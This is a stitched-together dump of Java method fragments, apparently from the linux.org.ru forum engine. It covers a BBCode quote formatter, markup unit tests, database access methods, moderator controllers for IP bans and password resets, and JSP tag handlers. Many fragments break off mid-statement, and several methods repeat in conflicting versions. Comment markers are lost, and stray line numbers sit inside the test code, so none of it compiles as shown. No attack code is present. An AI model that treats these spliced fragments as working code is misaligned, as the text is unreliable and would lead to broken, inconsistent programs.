public static String quote ( String text , String newLine ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = NL_REGEXP . split ( text ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; boolean isCode = false ; for ( String line : lines ) { currentLine + = 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( Strings . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { if ( isCode ) { buf . append ( '' ) ; } else { buf . append ( newLine ) ; } } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( ! isCode & & m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( Strings . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( Strings . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( Strings . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( escapeCode ( line . substring ( nestingLevel ) ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( Strings . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } Matcher codeMatcher = CODE_PATTERN . matcher ( line ) ; if ( codeMatcher . find ( ) ) { isCode = true ; } Matcher codeEndMatcher = CODE_END_PATTERN . matcher ( line ) ; if ( codeEndMatcher . find ( ) ) { isCode = false ; } buf . append ( line ) ; if ( currentLine < lines . length ) { if ( isCode ) { buf . append ( '' ) ; } else { buf . append ( newLine ) ; } } } } if ( globalNestingLevel > 0 ) { buf . append ( Strings . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
static String escapeCode ( String text ) { return CODE_ESCAPE_REGEXP . matcher ( text ) . replaceAll ( " $1[[$2]] " ) ; } 
public void listTest2 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][*]two[br][*]three[br][/list] " , MessageTextService . preprocessPostingText ( a , " ntobr " ) . text ( ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , MessageTextService . preprocessPostingText ( a , " lorcode " ) . text ( ) ) ; toLorCodeFormatter.format(a) String b = MessageTextService.preprocessPostingText(a, "ntobr").text(); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.preprocessPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest3 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br][*]two[br][*]three[br][/list] " , MessageTextService . preprocessPostingText ( a , " ntobr " ) . text ( ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , MessageTextService . preprocessPostingText ( a , " lorcode " ) . text ( ) ) ; toLorCodeFormatter.format(a, true) String b = MessageTextService.preprocessPostingText(a, "ntobr").text(); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.preprocessPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest4 ( ) { String a = " [list] n[*]one ncrap n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br]crap[br][*]two[br][*]three[br][/list] " , MessageTextService . preprocessPostingText ( a , " ntobr " ) . text ( ) ) ; assertEquals ( " [list] n[*]one ncrap n[*]two n[*]three n[/list] " , MessageTextService . preprocessPostingText ( a , " lorcode " ) . text ( ) ) ; toLorCodeFormatter.format(a) String b = MessageTextService.preprocessPostingText(a, "ntobr").text(); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.preprocessPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", 
public void init ( ) { TopicDao messageDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; toHtmlFormatter . setMessageDao ( messageDao ) ; toHtmlFormatter . setCommentDao ( commentDao ) ; LorCodeService lorCodeService = new LorCodeService ( ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; textService = new MessageTextService ( lorCodeService ) ; } 
private String formatNtobr ( String str ) { return textService . preprocessPostingText ( str , " ntobr " ) . text ( ) ; } 
private String format ( String str ) { return textService . preprocessPostingText ( str , " lorcode " ) . text ( ) ; } 
public void testToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , format ( QUOTING1 ) ) ; assertEquals ( RESULT_QUOTING2 , format ( QUOTING2 ) ) ; assertEquals ( RESULT_QUOTING3 , format ( QUOTING3 ) ) ; assertEquals ( " [quote]test[br][/quote]test " , format ( " >test ntest " ) ) ; 4 assertEquals("testtesttest", format("testtesttest")); 1 assertEquals("test[quote]test[/quote]", format("test>test")); 7 assertEquals("test &", formatNtobr("test &")); 8 assertEquals("test[br]test", formatNtobr("test\rtest")); 9 assertEquals("test[br]test", formatNtobr("testtest")); 10 assertEquals("[quote]test[br][/quote]test", formatNtobr(">testtest")); 11 assertEquals("[quote]test[br]test[/quote]", formatNtobr(">test>test")); 12 } 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , format ( " [code][/code] " ) ) ; assertEquals ( " [code=perl][/code] " , format ( " [code=perl][/code] " ) ) ; } 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , format ( " > test " + " [code] " + " > test " + " [/code] " ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , format ( " > test " + " > [code] " + " > test " ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , format ( " > test [code] " + " > test " + " > test [/code] " ) ) ; assertEquals ( " [code]test[/code] " + " [quote] test[/quote] " , format ( " [code]test[/code] " + " > test " ) ) ; assertEquals ( " [[code]] test " , format ( " [[code]] test " ) ) ; assertEquals ( " [quote] [[code]] test[/quote] " , format ( " > [[code]] test " ) ) ; assertEquals ( " [[code]] test " + 
public void againQuoteFormatter ( ) { assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , formatNtobr ( " >one n>>two n>one n>>>three " ) ) ; assertEquals ( " [quote]one[br][quote]two[br][/quote]one[br][quote][quote]three[/quote][/quote][/quote] " , format ( " >one n>>two n>one n>>>three " ) ) ; 
public void init ( ) { TopicDao messageDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; toHtmlFormatter . setMessageDao ( messageDao ) ; toHtmlFormatter . setCommentDao ( commentDao ) ; LorCodeService lorCodeService = new LorCodeService ( ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
private String formatNtobr ( String str ) { return MessageTextService . preprocessPostingText ( str , " ntobr " ) . text ( ) ; } 
private String format ( String str ) { return MessageTextService . preprocessPostingText ( str , " lorcode " ) . text ( ) ; } 
private static String fixFormat ( String mode ) { if ( MessageTextService . PostingModesJava ( ) . containsKey ( mode ) ) { return mode ; 
public void listTest2 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][*]two[br][*]three[br][/list] " , MessageTextService . prepareUlb ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , MessageTextService . processPostingText ( a , " lorcode " ) . text ( ) ) ; toLorCodeFormatter.format(a) String b = MessageTextService.prepareUlb(a); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.processPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest3 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br][*]two[br][*]three[br][/list] " , MessageTextService . prepareUlb ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , MessageTextService . processPostingText ( a , " lorcode " ) . text ( ) ) ; toLorCodeFormatter.format(a, true) String b = MessageTextService.prepareUlb(a); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.processPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest4 ( ) { String a = " [list] n[*]one ncrap n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br]crap[br][*]two[br][*]three[br][/list] " , MessageTextService . prepareUlb ( a ) ) ; assertEquals ( " [list] n[*]one ncrap n[*]two n[*]three n[/list] " , MessageTextService . processPostingText ( a , " lorcode " ) . text ( ) ) ; toLorCodeFormatter.format(a) String b = MessageTextService.prepareUlb(a); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = MessageTextService.processPostingText(a, "lorcode").text(); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", 
private String formatNtobr ( String str ) { return MessageTextService . prepareUlb ( str ) ; } 
private String format ( String str ) { return MessageTextService . prepareLorcode ( str ) ; } 
public static void generateCSRFCookie ( HttpServletRequest request , HttpServletResponse response ) { SecureRandom random = new SecureRandom ( ) ; byte [ ] value = new byte [ 16 ] ; random . nextBytes ( value ) ; String token = Base64 . getEncoder ( ) . encodeToString ( value ) ; Cookie cookie = new Cookie ( CSRF_COOKIE , token ) ; cookie . setMaxAge ( TWO_YEARS ) ; cookie . setPath ( " / " ) ; response . addCookie ( cookie ) ; request . setAttribute ( CSRF_ATTRIBUTE , token ) ; } 
public void checkCommentsEditingAllowed ( @Nonnull Comment comment , @Nonnull Topic topic , @Nullable User currentUser , Errors errors , MarkupType markup ) { Preconditions . checkNotNull ( comment ) ; Preconditions . checkNotNull ( topic ) ; boolean haveAnswers = commentService . isHaveAnswers ( comment ) ; checkCommentEditableNow ( comment , currentUser , haveAnswers , topic , errors , markup ) ; } 
public boolean isCommentEditableNow ( @Nonnull Comment comment , @Nullable User currentUser , boolean haveAnswers , @Nonnull Topic topic , MarkupType markup ) { Errors errors = new MapBindingResult ( ImmutableMap . of ( ) , " obj " ) ; checkCommentsAllowed ( topic , currentUser , errors ) ; checkCommentEditableNow ( comment , currentUser , haveAnswers , topic , errors , markup ) ; return ! errors . hasErrors ( ) ; } 
private static String fixFormat ( String mode ) { if ( MarkupType$ . MODULE$ . AllFormIds ( ) . contains ( mode ) ) { return mode ; 
String renderToHtml ( String content , boolean nofollow ) ; } 
public void testMarkdownFormatter ( ) { assertEquals ( TEXT1_RESULT , markdownFormatter . renderToHtml ( TEXT1 , false ) ) ; } 
public void init ( ) throws Exception { siteConfig = mock ( SiteConfig . class ) ; URI mainURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; URI secureURI = new URI ( " https:www.linux.org.ru/ " , true , " UTF-8 " ) ; Mockito . when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; Mockito . when ( siteConfig . getSecureURI ( ) ) . thenReturn ( secureURI ) ; } 
private void processMessageUrl ( @Nonnull StringBuilder out , @Nonnull LorURL url , @Nullable String linkText ) throws URIException { try { Topic message = topicDao . getById ( url . getMessageId ( ) ) ; 
public void init ( ) { TopicDao messageDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; toHtmlFormatter . setTopicDao ( messageDao ) ; toHtmlFormatter . setCommentDao ( commentDao ) ; LorCodeService lorCodeService = new LorCodeService ( ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void init ( ) throws Exception { SiteConfig siteConfig = mock ( SiteConfig . class ) ; URI mainURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; URI secureURI = new URI ( " https:www.linux.org.ru/ " , true , " UTF-8 " ) ; TopicDao topicDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; Mockito . when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; Mockito . when ( siteConfig . getSecureURI ( ) ) . thenReturn ( secureURI ) ; markdownFormatter = new FlexmarkMarkdownFormatter ( siteConfig , topicDao , commentDao ) ; } 
public void init ( ) throws Exception { SiteConfig siteConfig = mock ( SiteConfig . class ) ; URI mainURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; URI secureURI = new URI ( " https:www.linux.org.ru/ " , true , " UTF-8 " ) ; TopicDao topicDao = mock ( TopicDao . class ) ; CommentDao commentDao = mock ( CommentDao . class ) ; Mockito . when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; Mockito . when ( siteConfig . getSecureURI ( ) ) . thenReturn ( secureURI ) ; markdownFormatter = new FlexmarkMarkdownFormatter ( siteConfig , topicDao , commentDao , mock ( UserService . class ) , new ToHtmlFormatter ( ) ) ; 
public Topic getById ( int id ) throws MessageNotFoundException { return findById ( id ) . orElseThrow ( ( ) - > new MessageNotFoundException ( id ) ) ; } 
public Optional < Topic > findById ( int id ) { try { return Optional . of ( jdbcTemplate . queryForObject ( queryMessage , ( resultSet , i ) - > new Topic ( resultSet ) , id ) ) ; 
public void moveMessages ( int user , int targetUser ) { jdbcTemplate . update ( " UPDATE comments SET userid=? WHERE userid=? " , targetUser , user ) ; jdbcTemplate . update ( " UPDATE topics SET userid=? WHERE userid=? " , targetUser , user ) ; } 
public ElasticClient elasticClient ( ) { return mock ( ElasticClient . class ) ; } 
public void moveMessages ( int user , int targetUser ) { jdbcTemplate . update ( " UPDATE comments SET userid=? WHERE userid=? " , targetUser , user ) ; jdbcTemplate . update ( " UPDATE comments SET editor_id=? WHERE editor_id=? " , targetUser , user ) ; jdbcTemplate . update ( " UPDATE edit_info SET editor=? WHERE editor=? " , targetUser , user ) ; jdbcTemplate . update ( " UPDATE topics SET userid=? WHERE userid=? " , targetUser , user ) ; } 
public boolean isUndeletable ( ) { return undeletable ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , Profile profile , boolean loadUserpics ) { boolean topicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean tagsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; boolean undeletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; undeletable = groupPermissionService . isUndeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; undeletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , profile . getAvatarMode ( ) , true ) ; } return new TopicMenu ( topicEditable , 
public DeleteInfoDao deleteInfoDao ( DataSource dataSource ) { return new DeleteInfoDao ( dataSource ) ; } 
public boolean wasUserpicReset ( User user , Duration duration ) { return jdbcTemplate . queryForObject ( " SELECT EXISTS (SELECT * FROM user_log WHERE userid=? AND action=?::user_log_action AND action_date>? AND userid!=action_userid) " , 
public void updateComment ( final int msgid ) { Preconditions . checkArgument ( msgid ! = 0 , " msgid==0!? " ) ; jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateComments ( Lists . newArrayList ( msgid ) ) ) ) ; } 
public void updateComment ( final List < Integer > msgids ) { jmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateComments ( new ArrayList < > ( msgids ) ) ) ) ; } 
public boolean isCommitable ( ) { return commitable ; } 
public ModelAndView showModeratorForm ( @PathVariable String nick , HttpServletRequest request ) { User user = userService . getUser ( nick ) ; Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView modelAndView = new ModelAndView ( " confirm-password-reset " ) ; modelAndView . addObject ( " user " , user ) ; modelAndView . addObject ( " whoisLink " , UriComponentsBuilder . fromUriString ( " /people/{nick}/profile " ) . buildAndExpand ( nick ) . encode ( ) . toUriString ( ) ) ; return modelAndView ; } 
public void commence ( HttpServletRequest request , HttpServletResponse response , AuthenticationException authException ) { } } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = tmpl . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user , reason , ts , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public RedirectView showComments ( @RequestParam String nick ) { User user = userService . getUserCached ( nick ) ; return new RedirectView ( " search.jsp?range=COMMENTS&user= " + user . getNick ( ) + " &sort=DATE " ) ; } 
public ModelAndView showCommentsOld ( @PathVariable String nick , HttpServletRequest request ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userService . getUserCached ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
public Group getGroup ( Section section , String name ) throws GroupNotFoundException { Optional < Group > group = getGroupOpt ( section , name , false ) ; if ( group . isEmpty ( ) ) { logger . info ( " Group '{}' not found in section {} " , name , section . getUrlName ( ) ) ; 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) { Calendar current = Calendar . getInstance ( ) ; for ( int i = 0 ; i < 3 ; i + + ) { searchQueueSender . updateMonth ( current . get ( Calendar . YEAR ) , current . get ( Calendar . MONTH ) + 1 ) ; current . add ( Calendar . MONTH , - 1 ) ; } return new ModelAndView ( " action-done " , " message " , " Scheduled reindex last 3 month " ) ; } 
private static String buildParams ( Map < String , String > params ) { StringBuilder str = new StringBuilder ( ) ; for ( Entry < String , String > entry : params . entrySet ( ) ) { if ( str . length ( ) > 0 ) { str . append ( '&' ) ; } str . append ( URLEncoder . encode ( entry . getKey ( ) , StandardCharsets . UTF_8 ) ) ; str . append ( '=' ) ; str . append ( URLEncoder . encode ( entry . getValue ( ) , StandardCharsets . UTF_8 ) ) ; } return str . toString ( ) ; } 
public String getNewsViewerLink ( ) throws SectionNotFoundException { if ( id = = SECTION_FORUM ) { return " /forum/lenta/ " ; 
public int doStartTag ( ) { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; List < String > boxnames = ImmutableList . copyOf ( Iterables . filter ( . getProf ( ) . getBoxlets ( ) , DefaultProfile . boxPredicate ( ) ) ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public int doEndTag ( ) { pageContext . removeAttribute ( var ) ; return SKIP_BODY ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " topic " , new ApiCommentTopicInfo ( topic . getId ( ) , topic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; TODO: move to globals data.put("dateFormat", new SignTag.DateFormatHandler()); jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , user ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; TODO: move to globals data.put("dateFormat", new DateFormatHandler()); if (timeprop!=null) { data.put("timeprop", timeprop); } jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public ModelAndView archiveList ( int sectionid ) { return archiveList ( sectionid , null ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveStats > items = archiveDao . getArchiveStats ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public ModelAndView forumArchive ( @PathVariable String group ) { return archiveList ( Section . SECTION_FORUM , group ) ; } 
public LastMiniNews mapRow ( ResultSet rs , int i ) throws SQLException { final int answers = rs . getInt ( " c " ) ; final int answers0 = ( answers = = 0 ) ? 1 : answers ; final int tmp = answers0 / perPage ; final int pages = ( answers0 % perPage > 0 ) ? tmp + 1 : tmp ; return new LastMiniNews ( sectionService . getSection ( rs . getInt ( " section " ) ) . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) , 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " text " ) String text , @PathVariable String nick ) { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = tmpl . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , text ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Remark remark : list ) { User refUser = userDao . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } return remarksPrepared ; } 
public void writeProfile ( @Nonnull final User user , @Nonnull final Profile profile ) { String [ ] boxlets = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . toArray ( new String [ 0 ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( con - > { 
